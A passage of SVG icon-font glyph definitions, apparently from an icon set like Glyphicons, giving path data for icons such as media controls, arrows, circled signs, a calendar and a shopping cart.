<glyph unicode="&#xe067;" d="M350 1100h350q60 0 127 -23l-178 -177h-349q-41 0 -70.5 -29.5t-29.5 -70.5v-500q0 -41 29.5 -70.5t70.5 -29.5h500q41 0 70.5 29.5t29.5 70.5v69l200 200v-219q0 -165 -92.5 -257.5t-257.5 -92.5h-400q-165 0 -257.5 92.5t-92.5 257.5v400q0 165 92.5 257.5t257.5 92.5z M643 639l395 395q7 7 17.5 7t17.5 -7l101 -101q7 -7 7 -17.5t-7 -17.5l-531 -532q-7 -7 -17.5 -7t-17.5 7l-248 248q-7 7 -7 17.5t7 17.5l101 101q7 7 17.5 7t17.5 -7l111 -111q8 -7 18 -7t18 7z" />
<glyph unicode="&#xe068;" d="M318 918l264 264q8 8 18 8t18 -8l260 -264q7 -8 4.5 -13t-12.5 -5h-170v-200h200v173q0 10 5 12t13 -5l264 -260q8 -7 8 -17.5t-8 -17.5l-264 -265q-8 -7 -13 -5t-5 12v173h-200v-200h170q10 0 12.5 -5t-4.5 -13l-260 -264q-8 -8 -18 -8t-18 8l-264 264q-8 8 -5.5 13 t12.5 5h175v200h-200v-173q0 -10 -5 -12t-13 5l-264 265q-8 7 -8 17.5t8 17.5l264 260q8 7 13 5t5 -12v-173h200v200h-175q-10 0 -12.5 5t5.5 13z" />
<glyph unicode="&#xe069;" d="M250 1100h100q21 0 35.5 -14.5t14.5 -35.5v-438l464 453q15 14 25.5 10t10.5 -25v-1000q0 -21 -10.5 -25t-25.5 10l-464 453v-438q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v1000q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe070;" d="M50 1100h100q21 0 35.5 -14.5t14.5 -35.5v-438l464 453q15 14 25.5 10t10.5 -25v-438l464 453q15 14 25.5 10t10.5 -25v-1000q0 -21 -10.5 -25t-25.5 10l-464 453v-438q0 -21 -10.5 -25t-25.5 10l-464 453v-438q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5 t-14.5 35.5v1000q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe071;" d="M1200 1050v-1000q0 -21 -10.5 -25t-25.5 10l-464 453v-438q0 -21 -10.5 -25t-25.5 10l-492 480q-15 14 -15 35t15 35l492 480q15 14 25.5 10t10.5 -25v-438l464 453q15 14 25.5 10t10.5 -25z" />
<glyph unicode="&#xe072;" d="M243 1074l814 -498q18 -11 18 -26t-18 -26l-814 -498q-18 -11 -30.5 -4t-12.5 28v1000q0 21 12.5 28t30.5 -4z" />
<glyph unicode="&#xe073;" d="M250 1000h200q21 0 35.5 -14.5t14.5 -35.5v-800q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v800q0 21 14.5 35.5t35.5 14.5zM650 1000h200q21 0 35.5 -14.5t14.5 -35.5v-800q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v800 q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe074;" d="M1100 950v-800q0 -21 -14.5 -35.5t-35.5 -14.5h-800q-21 0 -35.5 14.5t-14.5 35.5v800q0 21 14.5 35.5t35.5 14.5h800q21 0 35.5 -14.5t14.5 -35.5z" />
<glyph unicode="&#xe075;" d="M500 612v438q0 21 10.5 25t25.5 -10l492 -480q15 -14 15 -35t-15 -35l-492 -480q-15 -14 -25.5 -10t-10.5 25v438l-464 -453q-15 -14 -25.5 -10t-10.5 25v1000q0 21 10.5 25t25.5 -10z" />
<glyph unicode="&#xe076;" d="M1048 1102l100 1q20 0 35 -14.5t15 -35.5l5 -1000q0 -21 -14.5 -35.5t-35.5 -14.5l-100 -1q-21 0 -35.5 14.5t-14.5 35.5l-2 437l-463 -454q-14 -15 -24.5 -10.5t-10.5 25.5l-2 437l-462 -455q-15 -14 -25.5 -9.5t-10.5 24.5l-5 1000q0 21 10.5 25.5t25.5 -10.5l466 -450 l-2 438q0 20 10.5 24.5t25.5 -9.5l466 -451l-2 438q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe077;" d="M850 1100h100q21 0 35.5 -14.5t14.5 -35.5v-1000q0 -21 -14.5 -35.5t-35.5 -14.5h-100q-21 0 -35.5 14.5t-14.5 35.5v438l-464 -453q-15 -14 -25.5 -10t-10.5 25v1000q0 21 10.5 25t25.5 -10l464 -453v438q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe078;" d="M686 1081l501 -540q15 -15 10.5 -26t-26.5 -11h-1042q-22 0 -26.5 11t10.5 26l501 540q15 15 36 15t36 -15zM150 400h1000q21 0 35.5 -14.5t14.5 -35.5v-100q0 -21 -14.5 -35.5t-35.5 -14.5h-1000q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe079;" d="M885 900l-352 -353l352 -353l-197 -198l-552 552l552 550z" />
<glyph unicode="&#xe080;" d="M1064 547l-551 -551l-198 198l353 353l-353 353l198 198z" />
<glyph unicode="&#xe081;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM650 900h-100q-21 0 -35.5 -14.5t-14.5 -35.5v-150h-150 q-21 0 -35.5 -14.5t-14.5 -35.5v-100q0 -21 14.5 -35.5t35.5 -14.5h150v-150q0 -21 14.5 -35.5t35.5 -14.5h100q21 0 35.5 14.5t14.5 35.5v150h150q21 0 35.5 14.5t14.5 35.5v100q0 21 -14.5 35.5t-35.5 14.5h-150v150q0 21 -14.5 35.5t-35.5 14.5z" />
<glyph unicode="&#xe082;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM850 700h-500q-21 0 -35.5 -14.5t-14.5 -35.5v-100q0 -21 14.5 -35.5 t35.5 -14.5h500q21 0 35.5 14.5t14.5 35.5v100q0 21 -14.5 35.5t-35.5 14.5z" />
<glyph unicode="&#xe083;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM741.5 913q-12.5 0 -21.5 -9l-120 -120l-120 120q-9 9 -21.5 9 t-21.5 -9l-141 -141q-9 -9 -9 -21.5t9 -21.5l120 -120l-120 -120q-9 -9 -9 -21.5t9 -21.5l141 -141q9 -9 21.5 -9t21.5 9l120 120l120 -120q9 -9 21.5 -9t21.5 9l141 141q9 9 9 21.5t-9 21.5l-120 120l120 120q9 9 9 21.5t-9 21.5l-141 141q-9 9 -21.5 9z" />
<glyph unicode="&#xe084;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM546 623l-84 85q-7 7 -17.5 7t-18.5 -7l-139 -139q-7 -8 -7 -18t7 -18 l242 -241q7 -8 17.5 -8t17.5 8l375 375q7 7 7 17.5t-7 18.5l-139 139q-7 7 -17.5 7t-17.5 -7z" />
<glyph unicode="&#xe085;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM588 941q-29 0 -59 -5.5t-63 -20.5t-58 -38.5t-41.5 -63t-16.5 -89.5 q0 -25 20 -25h131q30 -5 35 11q6 20 20.5 28t45.5 8q20 0 31.5 -10.5t11.5 -28.5q0 -23 -7 -34t-26 -18q-1 0 -13.5 -4t-19.5 -7.5t-20 -10.5t-22 -17t-18.5 -24t-15.5 -35t-8 -46q-1 -8 5.5 -16.5t20.5 -8.5h173q7 0 22 8t35 28t37.5 48t29.5 74t12 100q0 47 -17 83 t-42.5 57t-59.5 34.5t-64 18t-59 4.5zM675 400h-150q-10 0 -17.5 -7.5t-7.5 -17.5v-150q0 -10 7.5 -17.5t17.5 -7.5h150q10 0 17.5 7.5t7.5 17.5v150q0 10 -7.5 17.5t-17.5 7.5z" />
<glyph unicode="&#xe086;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM675 1000h-150q-10 0 -17.5 -7.5t-7.5 -17.5v-150q0 -10 7.5 -17.5 t17.5 -7.5h150q10 0 17.5 7.5t7.5 17.5v150q0 10 -7.5 17.5t-17.5 7.5zM675 700h-250q-10 0 -17.5 -7.5t-7.5 -17.5v-50q0 -10 7.5 -17.5t17.5 -7.5h75v-200h-75q-10 0 -17.5 -7.5t-7.5 -17.5v-50q0 -10 7.5 -17.5t17.5 -7.5h350q10 0 17.5 7.5t7.5 17.5v50q0 10 -7.5 17.5 t-17.5 7.5h-75v275q0 10 -7.5 17.5t-17.5 7.5z" />
<glyph unicode="&#xe087;" d="M525 1200h150q10 0 17.5 -7.5t7.5 -17.5v-194q103 -27 178.5 -102.5t102.5 -178.5h194q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-194q-27 -103 -102.5 -178.5t-178.5 -102.5v-194q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v194 q-103 27 -178.5 102.5t-102.5 178.5h-194q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5h194q27 103 102.5 178.5t178.5 102.5v194q0 10 7.5 17.5t17.5 7.5zM700 893v-168q0 -10 -7.5 -17.5t-17.5 -7.5h-150q-10 0 -17.5 7.5t-7.5 17.5v168q-68 -23 -119 -74 t-74 -119h168q10 0 17.5 -7.5t7.5 -17.5v-150q0 -10 -7.5 -17.5t-17.5 -7.5h-168q23 -68 74 -119t119 -74v168q0 10 7.5 17.5t17.5 7.5h150q10 0 17.5 -7.5t7.5 -17.5v-168q68 23 119 74t74 119h-168q-10 0 -17.5 7.5t-7.5 17.5v150q0 10 7.5 17.5t17.5 7.5h168 q-23 68 -74 119t-119 74z" />
<glyph unicode="&#xe088;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM759 823l64 -64q7 -7 7 -17.5t-7 -17.5l-124 -124l124 -124q7 -7 7 -17.5t-7 -17.5l-64 -64q-7 -7 -17.5 -7t-17.5 7l-124 124l-124 -124q-7 -7 -17.5 -7t-17.5 7l-64 64 q-7 7 -7 17.5t7 17.5l124 124l-124 124q-7 7 -7 17.5t7 17.5l64 64q7 7 17.5 7t17.5 -7l124 -124l124 124q7 7 17.5 7t17.5 -7z" />
<glyph unicode="&#xe089;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5t57 -214.5 t155.5 -155.5t214.5 -57t214.5 57t155.5 155.5t57 214.5t-57 214.5t-155.5 155.5t-214.5 57zM782 788l106 -106q7 -7 7 -17.5t-7 -17.5l-320 -321q-8 -7 -18 -7t-18 7l-202 203q-8 7 -8 17.5t8 17.5l106 106q7 8 17.5 8t17.5 -8l79 -79l197 197q7 7 17.5 7t17.5 -7z" />
<glyph unicode="&#xe090;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM600 1027q-116 0 -214.5 -57t-155.5 -155.5t-57 -214.5q0 -120 65 -225 l587 587q-105 65 -225 65zM965 819l-584 -584q104 -62 219 -62q116 0 214.5 57t155.5 155.5t57 214.5q0 115 -62 219z" />
<glyph unicode="&#xe091;" d="M39 582l522 427q16 13 27.5 8t11.5 -26v-291h550q21 0 35.5 -14.5t14.5 -35.5v-200q0 -21 -14.5 -35.5t-35.5 -14.5h-550v-291q0 -21 -11.5 -26t-27.5 8l-522 427q-16 13 -16 32t16 32z" />
<glyph unicode="&#xe092;" d="M639 1009l522 -427q16 -13 16 -32t-16 -32l-522 -427q-16 -13 -27.5 -8t-11.5 26v291h-550q-21 0 -35.5 14.5t-14.5 35.5v200q0 21 14.5 35.5t35.5 14.5h550v291q0 21 11.5 26t27.5 -8z" />
<glyph unicode="&#xe093;" d="M682 1161l427 -522q13 -16 8 -27.5t-26 -11.5h-291v-550q0 -21 -14.5 -35.5t-35.5 -14.5h-200q-21 0 -35.5 14.5t-14.5 35.5v550h-291q-21 0 -26 11.5t8 27.5l427 522q13 16 32 16t32 -16z" />
<glyph unicode="&#xe094;" d="M550 1200h200q21 0 35.5 -14.5t14.5 -35.5v-550h291q21 0 26 -11.5t-8 -27.5l-427 -522q-13 -16 -32 -16t-32 16l-427 522q-13 16 -8 27.5t26 11.5h291v550q0 21 14.5 35.5t35.5 14.5z" />
<glyph unicode="&#xe095;" d="M639 1109l522 -427q16 -13 16 -32t-16 -32l-522 -427q-16 -13 -27.5 -8t-11.5 26v291q-94 -2 -182 -20t-170.5 -52t-147 -92.5t-100.5 -135.5q5 105 27 193.5t67.5 167t113 135t167 91.5t225.5 42v262q0 21 11.5 26t27.5 -8z" />
<glyph unicode="&#xe096;" d="M850 1200h300q21 0 35.5 -14.5t14.5 -35.5v-300q0 -21 -10.5 -25t-24.5 10l-94 94l-249 -249q-8 -7 -18 -7t-18 7l-106 106q-7 8 -7 18t7 18l249 249l-94 94q-14 14 -10 24.5t25 10.5zM350 0h-300q-21 0 -35.5 14.5t-14.5 35.5v300q0 21 10.5 25t24.5 -10l94 -94l249 249 q8 7 18 7t18 -7l106 -106q7 -8 7 -18t-7 -18l-249 -249l94 -94q14 -14 10 -24.5t-25 -10.5z" />
<glyph unicode="&#xe097;" d="M1014 1120l106 -106q7 -8 7 -18t-7 -18l-249 -249l94 -94q14 -14 10 -24.5t-25 -10.5h-300q-21 0 -35.5 14.5t-14.5 35.5v300q0 21 10.5 25t24.5 -10l94 -94l249 249q8 7 18 7t18 -7zM250 600h300q21 0 35.5 -14.5t14.5 -35.5v-300q0 -21 -10.5 -25t-24.5 10l-94 94 l-249 -249q-8 -7 -18 -7t-18 7l-106 106q-7 8 -7 18t7 18l249 249l-94 94q-14 14 -10 24.5t25 10.5z" />
<glyph unicode="&#xe101;" d="M600 1177q117 0 224 -45.5t184.5 -123t123 -184.5t45.5 -224t-45.5 -224t-123 -184.5t-184.5 -123t-224 -45.5t-224 45.5t-184.5 123t-123 184.5t-45.5 224t45.5 224t123 184.5t184.5 123t224 45.5zM704 900h-208q-20 0 -32 -14.5t-8 -34.5l58 -302q4 -20 21.5 -34.5 t37.5 -14.5h54q20 0 37.5 14.5t21.5 34.5l58 302q4 20 -8 34.5t-32 14.5zM675 400h-150q-10 0 -17.5 -7.5t-7.5 -17.5v-150q0 -10 7.5 -17.5t17.5 -7.5h150q10 0 17.5 7.5t7.5 17.5v150q0 10 -7.5 17.5t-17.5 7.5z" />
<glyph unicode="&#xe102;" d="M260 1200q9 0 19 -2t15 -4l5 -2q22 -10 44 -23l196 -118q21 -13 36 -24q29 -21 37 -12q11 13 49 35l196 118q22 13 45 23q17 7 38 7q23 0 47 -16.5t37 -33.5l13 -16q14 -21 18 -45l25 -123l8 -44q1 -9 8.5 -14.5t17.5 -5.5h61q10 0 17.5 -7.5t7.5 -17.5v-50 q0 -10 -7.5 -17.5t-17.5 -7.5h-50q-10 0 -17.5 -7.5t-7.5 -17.5v-175h-400v300h-200v-300h-400v175q0 10 -7.5 17.5t-17.5 7.5h-50q-10 0 -17.5 7.5t-7.5 17.5v50q0 10 7.5 17.5t17.5 7.5h61q11 0 18 3t7 8q0 4 9 52l25 128q5 25 19 45q2 3 5 7t13.5 15t21.5 19.5t26.5 15.5 t29.5 7zM915 1079l-166 -162q-7 -7 -5 -12t12 -5h219q10 0 15 7t2 17l-51 149q-3 10 -11 12t-15 -6zM463 917l-177 157q-8 7 -16 5t-11 -12l-51 -143q-3 -10 2 -17t15 -7h231q11 0 12.5 5t-5.5 12zM500 0h-375q-10 0 -17.5 7.5t-7.5 17.5v375h400v-400zM1100 400v-375 q0 -10 -7.5 -17.5t-17.5 -7.5h-375v400h400z" />
<glyph unicode="&#xe103;" d="M1165 1190q8 3 21 -6.5t13 -17.5q-2 -178 -24.5 -323.5t-55.5 -245.5t-87 -174.5t-102.5 -118.5t-118 -68.5t-118.5 -33t-120 -4.5t-105 9.5t-90 16.5q-61 12 -78 11q-4 1 -12.5 0t-34 -14.5t-52.5 -40.5l-153 -153q-26 -24 -37 -14.5t-11 43.5q0 64 42 102q8 8 50.5 45 t66.5 58q19 17 35 47t13 61q-9 55 -10 102.5t7 111t37 130t78 129.5q39 51 80 88t89.5 63.5t94.5 45t113.5 36t129 31t157.5 37t182 47.5zM1116 1098q-8 9 -22.5 -3t-45.5 -50q-38 -47 -119 -103.5t-142 -89.5l-62 -33q-56 -30 -102 -57t-104 -68t-102.5 -80.5t-85.5 -91 t-64 -104.5q-24 -56 -31 -86t2 -32t31.5 17.5t55.5 59.5q25 30 94 75.5t125.5 77.5t147.5 81q70 37 118.5 69t102 79.5t99 111t86.5 148.5q22 50 24 60t-6 19z" />
<glyph unicode="&#xe104;" d="M653 1231q-39 -67 -54.5 -131t-10.5 -114.5t24.5 -96.5t47.5 -80t63.5 -62.5t68.5 -46.5t65 -30q-4 7 -17.5 35t-18.5 39.5t-17 39.5t-17 43t-13 42t-9.5 44.5t-2 42t4 43t13.5 39t23 38.5q96 -42 165 -107.5t105 -138t52 -156t13 -159t-19 -149.5q-13 -55 -44 -106.5 t-68 -87t-78.5 -64.5t-72.5 -45t-53 -22q-72 -22 -127 -11q-31 6 -13 19q6 3 17 7q13 5 32.5 21t41 44t38.5 63.5t21.5 81.5t-6.5 94.5t-50 107t-104 115.5q10 -104 -0.5 -189t-37 -140.5t-65 -93t-84 -52t-93.5 -11t-95 24.5q-80 36 -131.5 114t-53.5 171q-2 23 0 49.5 t4.5 52.5t13.5 56t27.5 60t46 64.5t69.5 68.5q-8 -53 -5 -102.5t17.5 -90t34 -68.5t44.5 -39t49 -2q31 13 38.5 36t-4.5 55t-29 64.5t-36 75t-26 75.5q-15 85 2 161.5t53.5 128.5t85.5 92.5t93.5 61t81.5 25.5z" />
<glyph unicode="&#xe105;" d="M600 1094q82 0 160.5 -22.5t140 -59t116.5 -82.5t94.5 -95t68 -95t42.5 -82.5t14 -57.5t-14 -57.5t-43 -82.5t-68.5 -95t-94.5 -95t-116.5 -82.5t-140 -59t-159.5 -22.5t-159.5 22.5t-140 59t-116.5 82.5t-94.5 95t-68.5 95t-43 82.5t-14 57.5t14 57.5t42.5 82.5t68 95 t94.5 95t116.5 82.5t140 59t160.5 22.5zM888 829q-15 15 -18 12t5 -22q25 -57 25 -119q0 -124 -88 -212t-212 -88t-212 88t-88 212q0 59 23 114q8 19 4.5 22t-17.5 -12q-70 -69 -160 -184q-13 -16 -15 -40.5t9 -42.5q22 -36 47 -71t70 -82t92.5 -81t113 -58.5t133.5 -24.5 t133.5 24t113 58.5t92.5 81.5t70 81.5t47 70.5q11 18 9 42.5t-14 41.5q-90 117 -163 189zM448 727l-35 -36q-15 -15 -19.5 -38.5t4.5 -41.5q37 -68 93 -116q16 -13 38.5 -11t36.5 17l35 34q14 15 12.5 33.5t-16.5 33.5q-44 44 -89 117q-11 18 -28 20t-32 -12z" />
<glyph unicode="&#xe106;" d="M592 0h-148l31 120q-91 20 -175.5 68.5t-143.5 106.5t-103.5 119t-66.5 110t-22 76q0 21 14 57.5t42.5 82.5t68 95t94.5 95t116.5 82.5t140 59t160.5 22.5q61 0 126 -15l32 121h148zM944 770l47 181q108 -85 176.5 -192t68.5 -159q0 -26 -19.5 -71t-59.5 -102t-93 -112 t-129 -104.5t-158 -75.5l46 173q77 49 136 117t97 131q11 18 9 42.5t-14 41.5q-54 70 -107 130zM310 824q-70 -69 -160 -184q-13 -16 -15 -40.5t9 -42.5q18 -30 39 -60t57 -70.5t74 -73t90 -61t105 -41.5l41 154q-107 18 -178.5 101.5t-71.5 193.5q0 59 23 114q8 19 4.5 22 t-17.5 -12zM448 727l-35 -36q-15 -15 -19.5 -38.5t4.5 -41.5q37 -68 93 -116q16 -13 38.5 -11t36.5 17l12 11l22 86l-3 4q-44 44 -89 117q-11 18 -28 20t-32 -12z" />
<glyph unicode="&#xe107;" d="M-90 100l642 1066q20 31 48 28.5t48 -35.5l642 -1056q21 -32 7.5 -67.5t-50.5 -35.5h-1294q-37 0 -50.5 34t7.5 66zM155 200h345v75q0 10 7.5 17.5t17.5 7.5h150q10 0 17.5 -7.5t7.5 -17.5v-75h345l-445 723zM496 700h208q20 0 32 -14.5t8 -34.5l-58 -252 q-4 -20 -21.5 -34.5t-37.5 -14.5h-54q-20 0 -37.5 14.5t-21.5 34.5l-58 252q-4 20 8 34.5t32 14.5z" />
<glyph unicode="&#xe108;" d="M650 1200q62 0 106 -44t44 -106v-339l363 -325q15 -14 26 -38.5t11 -44.5v-41q0 -20 -12 -26.5t-29 5.5l-359 249v-263q100 -93 100 -113v-64q0 -21 -13 -29t-32 1l-205 128l-205 -128q-19 -9 -32 -1t-13 29v64q0 20 100 113v263l-359 -249q-17 -12 -29 -5.5t-12 26.5v41 q0 20 11 44.5t26 38.5l363 325v339q0 62 44 106t106 44z" />
<glyph unicode="&#xe109;" d="M850 1200h100q21 0 35.5 -14.5t14.5 -35.5v-50h50q21 0 35.5 -14.5t14.5 -35.5v-150h-1100v150q0 21 14.5 35.5t35.5 14.5h50v50q0 21 14.5 35.5t35.5 14.5h100q21 0 35.5 -14.5t14.5 -35.5v-50h500v50q0 21 14.5 35.5t35.5 14.5zM1100 800v-750q0 -21 -14.5 -35.5 t-35.5 -14.5h-1000q-21 0 -35.5 14.5t-14.5 35.5v750h1100zM100 600v-100h100v100h-100zM300 600v-100h100v100h-100zM500 600v-100h100v100h-100zM700 600v-100h100v100h-100zM900 600v-100h100v100h-100zM100 400v-100h100v100h-100zM300 400v-100h100v100h-100zM500 400 v-100h100v100h-100zM700 400v-100h100v100h-100zM900 400v-100h100v100h-100zM100 200v-100h100v100h-100zM300 200v-100h100v100h-100zM500 200v-100h100v100h-100zM700 200v-100h100v100h-100zM900 200v-100h100v100h-100z" />
<glyph unicode="&#xe110;" d="M1135 1165l249 -230q15 -14 15 -35t-15 -35l-249 -230q-14 -14 -24.5 -10t-10.5 25v150h-159l-600 -600h-291q-21 0 -35.5 14.5t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h209l600 600h241v150q0 21 10.5 25t24.5 -10zM522 819l-141 -141l-122 122h-209q-21 0 -35.5 14.5 t-14.5 35.5v100q0 21 14.5 35.5t35.5 14.5h291zM1135 565l249 -230q15 -14 15 -35t-15 -35l-249 -230q-14 -14 -24.5 -10t-10.5 25v150h-241l-181 181l141 141l122 -122h159v150q0 21 10.5 25t24.5 -10z" />
<glyph unicode="&#xe111;" d="M100 1100h1000q41 0 70.5 -29.5t29.5 -70.5v-600q0 -41 -29.5 -70.5t-70.5 -29.5h-596l-304 -300v300h-100q-41 0 -70.5 29.5t-29.5 70.5v600q0 41 29.5 70.5t70.5 29.5z" />
<glyph unicode="&#xe112;" d="M150 1200h200q21 0 35.5 -14.5t14.5 -35.5v-250h-300v250q0 21 14.5 35.5t35.5 14.5zM850 1200h200q21 0 35.5 -14.5t14.5 -35.5v-250h-300v250q0 21 14.5 35.5t35.5 14.5zM1100 800v-300q0 -41 -3 -77.5t-15 -89.5t-32 -96t-58 -89t-89 -77t-129 -51t-174 -20t-174 20 t-129 51t-89 77t-58 89t-32 96t-15 89.5t-3 77.5v300h300v-250v-27v-42.5t1.5 -41t5 -38t10 -35t16.5 -30t25.5 -24.5t35 -19t46.5 -12t60 -4t60 4.5t46.5 12.5t35 19.5t25 25.5t17 30.5t10 35t5 38t2 40.5t-0.5 42v25v250h300z" />
<glyph unicode="&#xe113;" d="M1100 411l-198 -199l-353 353l-353 -353l-197 199l551 551z" />
<glyph unicode="&#xe114;" d="M1101 789l-550 -551l-551 551l198 199l353 -353l353 353z" />
<glyph unicode="&#xe115;" d="M404 1000h746q21 0 35.5 -14.5t14.5 -35.5v-551h150q21 0 25 -10.5t-10 -24.5l-230 -249q-14 -15 -35 -15t-35 15l-230 249q-14 14 -10 24.5t25 10.5h150v401h-381zM135 984l230 -249q14 -14 10 -24.5t-25 -10.5h-150v-400h385l215 -200h-750q-21 0 -35.5 14.5 t-14.5 35.5v550h-150q-21 0 -25 10.5t10 24.5l230 249q14 15 35 15t35 -15z" />
<glyph unicode="&#xe116;" d="M56 1200h94q17 0 31 -11t18 -27l38 -162h896q24 0 39 -18.5t10 -42.5l-100 -475q-5 -21 -27 -42.5t-55 -21.5h-633l48 -200h535q21 0 35.5 -14.5t14.5 -35.5t-14.5 -35.5t-35.5 -14.5h-50v-50q0 -21 -14.5 -35.5t-35.5 -14.5t-35.5 14.5t-14.5 35.5v50h-300v-50 q0 -21 -14.5 -35.5t-35.5 -14.5t-35.5 14.5t-14.5 35.5v50h-31q-18 0 -32.5 10t-20.5 19l-5 10l-201 961h-54q-20 0 -35 14.5t-15 35.5t15 35.5t35 14.5z" />
<glyph unicode="&#xe117;" d="M1200 1000v-100h-1200v100h200q0 41 29.5 70.5t70.5 29.5h300q41 0 70.5 -29.5t29.5 -70.5h500zM0 800h1200v-800h-1200v800z" />
<glyph unicode="&#xe118;" d="M200 800l-200 -400v600h200q0 41 29.5 70.5t70.5 29.5h300q42 0 71 -29.5t29 -70.5h500v-200h-1000zM1500 700l-300 -700h-1200l300 700h1200z" />
<glyph unicode="&#xe119;" d="M635 1184l230 -249q14 -14 10 -24.5t-25 -10.5h-150v-601h150q21 0 25 -10.5t-10 -24.5l-230 -249q-14 -15 -35 -15t-35 15l-230 249q-14 14 -10 24.5t25 10.5h150v601h-150q-21 0 -25 10.5t10 24.5l230 249q14 15 35 15t35 -15z" />
<glyph unicode="&#xe120;" d="M936 864l249 -229q14 -15 14 -35.5t-14 -35.5l-249 -229q-15 -15 -25.5 -10.5t-10.5 24.5v151h-600v-151q0 -20 -10.5 -24.5t-25.5 10.5l-249 229q-14 15 -14 35.5t14 35.5l249 229q15 15 25.5 10.5t10.5 -25.5v-149h600v149q0 21 10.5 25.5t25.5 -10.5z" />
<glyph unicode="&#xe121;" d="M1169 400l-172 732q-5 23 -23 45.5t-38 22.5h-672q-20 0 -38 -20t-23 -41l-172 -739h1138zM1100 300h-1000q-41 0 -70.5 -29.5t-29.5 -70.5v-100q0 -41 29.5 -70.5t70.5 -29.5h1000q41 0 70.5 29.5t29.5 70.5v100q0 41 -29.5 70.5t-70.5 29.5zM800 100v100h100v-100h-100 zM1000 100v100h100v-100h-100z" />
<glyph unicode="&#xe122;" d="M1150 1100q21 0 35.5 -14.5t14.5 -35.5v-850q0 -21 -14.5 -35.5t-35.5 -14.5t-35.5 14.5t-14.5 35.5v850q0 21 14.5 35.5t35.5 14.5zM1000 200l-675 200h-38l47 -276q3 -16 -5.5 -20t-29.5 -4h-7h-84q-20 0 -34.5 14t-18.5 35q-55 337 -55 351v250v6q0 16 1 23.5t6.5 14 t17.5 6.5h200l675 250v-850zM0 750v-250q-4 0 -11 0.5t-24 6t-30 15t-24 30t-11 48.5v50q0 26 10.5 46t25 30t29 16t25.5 7z" />
<glyph unicode="&#xe123;" d="M553 1200h94q20 0 29 -10.5t3 -29.5l-18 -37q83 -19 144 -82.5t76 -140.5l63 -327l118 -173h17q19 0 33 -14.5t14 -35t-13 -40.5t-31 -27q-8 -4 -23 -9.5t-65 -19.5t-103 -25t-132.5 -20t-158.5 -9q-57 0 -115 5t-104 12t-88.5 15.5t-73.5 17.5t-54.5 16t-35.5 12l-11 4 q-18 8 -31 28t-13 40.5t14 35t33 14.5h17l118 173l63 327q15 77 76 140t144 83l-18 32q-6 19 3.5 32t28.5 13zM498 110q50 -6 102 -6q53 0 102 6q-12 -49 -39.5 -79.5t-62.5 -30.5t-63 30.5t-39 79.5z" />
<glyph unicode="&#xe124;" d="M800 946l224 78l-78 -224l234 -45l-180 -155l180 -155l-234 -45l78 -224l-224 78l-45 -234l-155 180l-155 -180l-45 234l-224 -78l78 224l-234 45l180 155l-180 155l234 45l-78 224l224 -78l45 234l155 -180l155 180z" />
